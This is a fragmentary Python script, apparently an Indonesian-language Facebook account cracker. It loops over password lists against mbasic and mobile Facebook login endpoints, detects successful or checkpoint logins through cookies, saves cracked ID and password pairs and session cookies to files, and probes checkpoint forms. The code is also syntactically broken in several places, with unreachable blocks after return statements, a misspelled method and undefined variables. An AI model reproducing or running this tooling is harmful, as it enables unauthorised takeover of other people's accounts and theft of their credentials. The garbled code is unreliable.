...
def log_hasil(user, pasw):
    ...
    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',ged.text))
    ...
    if "c_user" in ses.cookies:
      jalan(f"\r{P}[•]{I} akun berhasil di login")
        ...
        tempek = par(ses.post(host+form["action"], data=data).text, "html.parser")
...
def mbasic(uid, fii):
	...
	for pw in fii:
		...
		for i in b("input"):
			...
			data.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false"})
		deku = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)
		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
		if "c_user" in ses.cookies.get_dict().keys():return {"status":"ok","email": uid,"pass":pw,"cookies":kuki}
			print(f"\r{B} |----> {I}{uid}•{pw}")
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():return {"status":"ok","email": uid,"pass":pw,"cookies":kuki}
			try:
				token = open('login/token.json','r').read()
				cookie = {'cookie':open('login/cookie.json','r').read()}
...
def mbasicc(uid, fii):
	...
	for pw in fii:
		...
		for i in b("input"):
			try:
				if i.get("name") in bl:data.update({i.get("name"):i.get("value")})
				data.udate({"fb_dtsg":meta,"m_sess":"","__user":"0","__req":"d","__csr":"","__a":"","__dyn":"","encpass":""})
				else:continue
			except:pass
			data.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false"})
		deku = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)
...
def mobil(uid, fii):
	...
	for pw in fii:
		...
		data.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false"})
		deku = ses.post("https://mobile.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)
		if "c_user" in ses.cookies.get_dict().keys():return {"status":"ok","email":uid,"pass":pw,"cookies":kuki}
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
			print(f"\r{B} |----> {I}{uid}•{pw}")
			ok.append("%s|%s"%(uid, pw))
...
def mobill(uid, fii):
	...
	for pw in fii:
		...
		if "c_user" in ses.cookies.get_dict().keys():return {"status":"ok","email":uid,"pass":pw,"cookies":kuki}
			...
			open("OK/%s.json"%(tanggal),"a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():return {"status":"ok","email":em,"pass":pas,"cookies":kuki}
			try:
				token = open('login/token.json','r').read()
				cookie = {'cookie':open('login/cookie.json','r').read()}
				with requests.Session() as ses:
...
def cek_log(uid,pw,ua):
	...
	if "checkpoint" in ses.cookies:
		...
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		data = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"fb_dtsg": meta,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		tempek = parser(ses.post(mb+form["action"], data=data).text, "html.parser")
		ngew = [yy.text for yy in tempek.find_all("option")]
		print(f"\r{P}[√]{K}-----> {B}{uid}•{pw}")
		for opt in range(len(ngew)):
			jalan(f"\r{U}[{B}{str(opt+1)}{U}]{B}>>>>>{U}[{B}{ngew[opt]}{U}")
